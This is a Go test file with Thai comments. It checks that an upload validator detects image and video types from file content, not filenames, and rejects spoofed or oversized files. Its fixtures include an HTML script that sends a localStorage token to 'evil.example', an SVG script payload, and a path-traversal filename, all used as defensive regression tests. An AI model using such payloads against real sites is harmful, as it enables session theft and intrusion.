package controllers

import (
	"bytes"
	"errors"
	"mime/multipart"
	"strings"
	"testing"
)

// makeFileHeader สร้าง *multipart.FileHeader จำลอง เหมือนที่ได้จาก c.FormFile()
//
// filename ตั้งได้อิสระเพื่อทดสอบว่าโค้ด "ไม่เชื่อชื่อไฟล์" จริงตามที่ตั้งใจไว้
func makeFileHeader(t *testing.T, filename string, content []byte) *multipart.FileHeader {
	t.Helper()

	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)

	part, err := w.CreateFormFile("file", filename)
	if err != nil {
		t.Fatalf("สร้าง form file ไม่สำเร็จ: %v", err)
	}
	if _, err := part.Write(content); err != nil {
		t.Fatalf("เขียนเนื้อไฟล์ไม่สำเร็จ: %v", err)
	}
	if err := w.Close(); err != nil {
		t.Fatalf("ปิด writer ไม่สำเร็จ: %v", err)
	}

	form, err := multipart.NewReader(&buf, w.Boundary()).ReadForm(int64(buf.Len()) + 1024)
	if err != nil {
		t.Fatalf("อ่าน form ไม่สำเร็จ: %v", err)
	}
	return form.File["file"][0]
}

// ─── ข้อมูลตัวอย่างของแต่ละชนิดไฟล์ (ลายเซ็นไบต์ต้นไฟล์จริง) ───

func pngBytes() []byte {
	return append([]byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'}, make([]byte, 64)...)
}

func jpegBytes() []byte {
	return append([]byte{0xff, 0xd8, 0xff, 0xe0}, make([]byte, 64)...)
}

func gifBytes() []byte {
	return append([]byte("GIF89a"), make([]byte, 64)...)
}

// mp4Bytes สร้างหัวไฟล์ mp4 ที่ผ่านเกณฑ์ของ http.DetectContentType
// (ขนาด box 20 ไบต์ ตามด้วย "ftyp" และ brand ที่ขึ้นต้นด้วย "mp4")
func mp4Bytes() []byte {
	b := []byte{0x00, 0x00, 0x00, 0x14}
	b = append(b, []byte("ftyp")...)
	b = append(b, []byte("mp41")...)
	b = append(b, []byte("isom")...)
	return append(b, make([]byte, 64)...)
}

// ─────────────────────────────────────────────────────────────────────────────
// เทสหลักของช่องโหว่ที่แก้
// ─────────────────────────────────────────────────────────────────────────────

// ไฟล์ HTML ที่เปลี่ยนชื่อเป็น .jpg ต้องถูกปฏิเสธ
//
// นี่คือหัวใจของช่องโหว่เดิม: โค้ดเก่าเชื่อนามสกุลจากชื่อไฟล์ ทำให้ไฟล์นี้
// ถูกบันทึกเป็น .jpg แต่ถ้าคนร้ายตั้งชื่อ evil.html ก็จะได้ไฟล์ .html
// ที่เสิร์ฟจาก origin เดียวกับเว็บ แล้วขโมย token ใน localStorage ได้
func TestValidateImageRejectsHTMLDisguisedAsImage(t *testing.T) {
	html := []byte(`<html><script>fetch('https://evil.example/?t='+localStorage.token)</script></html>`)
	fh := makeFileHeader(t, "photo.jpg", html)

	_, err := ValidateImageUpload(fh)
	if !errors.Is(err, ErrUploadBadType) {
		t.Fatalf("ไฟล์ HTML ที่ปลอมเป็นรูปต้องถูกปฏิเสธ แต่ได้ error: %v", err)
	}
}

// ไฟล์ SVG ต้องถูกปฏิเสธ เพราะฝัง <script> ได้ทั้งที่ดูเหมือนรูป
func TestValidateImageRejectsSVG(t *testing.T) {
	svg := []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`)
	fh := makeFileHeader(t, "logo.svg", svg)

	if _, err := ValidateImageUpload(fh); err == nil {
		t.Fatal("ไฟล์ SVG ต้องถูกปฏิเสธ แต่ผ่านไปได้")
	}
}

// นามสกุลที่ได้ต้องมาจากเนื้อไฟล์ ไม่ใช่จากชื่อไฟล์ที่ client ส่งมา
func TestValidateImageDerivesExtFromContentNotFilename(t *testing.T) {
	// เนื้อในเป็น PNG แต่ตั้งชื่อว่า .jpg — ต้องได้ .png ตามเนื้อจริง
	fh := makeFileHeader(t, "anything.jpg", pngBytes())

	ext, err := ValidateImageUpload(fh)
	if err != nil {
		t.Fatalf("ไฟล์ PNG ควรผ่าน แต่ได้ error: %v", err)
	}
	if ext != ".png" {
		t.Fatalf("ต้องได้ .png ตามเนื้อไฟล์จริง แต่ได้ %s", ext)
	}
}

// ชื่อไฟล์ที่พยายามไต่ออกนอกโฟลเดอร์ต้องไม่มีผล เพราะเราไม่ได้เอาชื่อเดิมไปใช้เลย
func TestValidateImageIgnoresPathTraversalFilename(t *testing.T) {
	fh := makeFileHeader(t, "../../../../etc/passwd.png", pngBytes())

	ext, err := ValidateImageUpload(fh)
	if err != nil {
		t.Fatalf("ควรผ่านเพราะเนื้อไฟล์เป็น PNG จริง แต่ได้ error: %v", err)
	}
	if strings.ContainsAny(ext, "/\\.") && ext != ".png" {
		t.Fatalf("นามสกุลที่ได้ต้องเป็น .png เท่านั้น แต่ได้ %s", ext)
	}
}

// ─── เคสปกติที่ต้องไม่ถูกบล็อก ───

func TestValidateImageAcceptsCommonFormats(t *testing.T) {
	cases := []struct {
		name    string
		content []byte
		wantExt string
	}{
		{"PNG", pngBytes(), ".png"},
		{"JPEG", jpegBytes(), ".jpg"},
		{"GIF", gifBytes(), ".gif"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			fh := makeFileHeader(t, "upload.bin", tc.content)

			ext, err := ValidateImageUpload(fh)
			if err != nil {
				t.Fatalf("ควรผ่าน แต่ได้ error: %v", err)
			}
			if ext != tc.wantExt {
				t.Fatalf("ต้องได้ %s แต่ได้ %s", tc.wantExt, ext)
			}
		})
	}
}

func TestValidateVideoAcceptsMP4(t *testing.T) {
	fh := makeFileHeader(t, "clip.mov", mp4Bytes())

	ext, err := ValidateVideoUpload(fh)
	if err != nil {
		t.Fatalf("ไฟล์ mp4 ควรผ่าน แต่ได้ error: %v", err)
	}
	if ext != ".mp4" {
		t.Fatalf("ต้องได้ .mp4 แต่ได้ %s", ext)
	}
}

// เส้นวิดีโอต้องไม่รับรูป และเส้นรูปต้องไม่รับวิดีโอ
func TestValidateRejectsWrongCategory(t *testing.T) {
	if _, err := ValidateVideoUpload(makeFileHeader(t, "a.mp4", pngBytes())); err == nil {
		t.Fatal("เส้นวิดีโอไม่ควรรับไฟล์รูป")
	}
	if _, err := ValidateImageUpload(makeFileHeader(t, "a.png", mp4Bytes())); err == nil {
		t.Fatal("เส้นรูปไม่ควรรับไฟล์วิดีโอ")
	}
}

// ─── ขนาดไฟล์ ───

func TestValidateImageRejectsOversize(t *testing.T) {
	big := append(pngBytes(), make([]byte, MaxImageUploadBytes+1)...)
	fh := makeFileHeader(t, "big.png", big)

	_, err := ValidateImageUpload(fh)
	if !errors.Is(err, ErrUploadTooLarge) {
		t.Fatalf("ไฟล์เกินขนาดต้องถูกปฏิเสธด้วย ErrUploadTooLarge แต่ได้: %v", err)
	}
}

func TestValidateImageRejectsEmptyFile(t *testing.T) {
	fh := makeFileHeader(t, "empty.png", nil)

	if _, err := ValidateImageUpload(fh); err == nil {
		t.Fatal("ไฟล์ว่างต้องถูกปฏิเสธ")
	}
}

// ไฟล์ใหญ่เกินต้องได้ 413 ส่วนชนิดผิดได้ 400 — คนละความหมาย ผู้ใช้จะได้รู้ว่าต้องแก้อะไร
func TestUploadErrorStatus(t *testing.T) {
	if got := UploadErrorStatus(ErrUploadTooLarge); got != 413 {
		t.Fatalf("ไฟล์ใหญ่เกินควรได้ 413 แต่ได้ %d", got)
	}
	if got := UploadErrorStatus(ErrUploadBadType); got != 400 {
		t.Fatalf("ชนิดไฟล์ผิดควรได้ 400 แต่ได้ %d", got)
	}
}
